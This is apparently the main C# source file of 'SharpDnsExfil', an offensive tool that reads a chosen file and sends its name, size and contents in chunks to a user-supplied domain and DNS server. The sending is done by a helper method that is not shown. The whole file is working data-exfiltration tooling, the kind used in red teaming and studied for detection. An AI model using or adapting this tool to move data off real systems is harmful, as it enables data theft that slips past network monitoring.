using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using CommandLine;
using SharpDnsExfil.Utils;

namespace SharpDnsExfil
{

    class Program
    {

        static void banner()
        {
            string help = @"
____  _   _ ____  _____       __ _ _ 
|  _ \| \ | / ___|| ____|_  __/ _(_) |
| | | |  \| \___ \|  _| \ \/ / |_| | |
| |_| | |\  |___) | |___ >  <|  _| | |
|____/|_| \_|____/|_____/_/\_\_| |_|_|
@ch4rm
";
            Console.WriteLine(help);
        }

        public static long totalSize { get; set; }

        static void Main(string[] args)
        {
            banner();

            CommandLine.Parser.Default.ParseArguments<Options>(args)
             .WithParsed(RunOptions)
             .WithNotParsed(HandleParseError);

        }

        public static void RunOptions(Options opts)
        {
            var filePath = opts.FilePath;
            Utilities utils = new Utilities();

            int currentByte = 0;
            int oldPercent = 0;

            if (!File.Exists(filePath))
            {
                Logger.WriteLine("[!] File not exist", opts.Verbose);
                return;
            }

            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + Path.GetFileName(opts.FilePath)), opts.Domain, opts.Server, opts.Verbose);
            utils.Exfiltrate(Encoding.UTF8.GetBytes("File Size:::" + utils.GetFileSize(opts.FilePath)), opts.Domain, opts.Server, opts.Verbose);

            foreach (var chunk in utils.ReadFileChunks(filePath))
            {
                currentByte += chunk.Length;
                int percent = (int)(0.5f + ((100f * currentByte) / totalSize));

                if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
                    Console.WriteLine($"Uploading to {opts.Domain} - {percent}% transfered");
                oldPercent = percent;

                utils.Exfiltrate(chunk, opts.Domain, opts.Server, opts.Verbose);
            }
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {
        }
    }
}
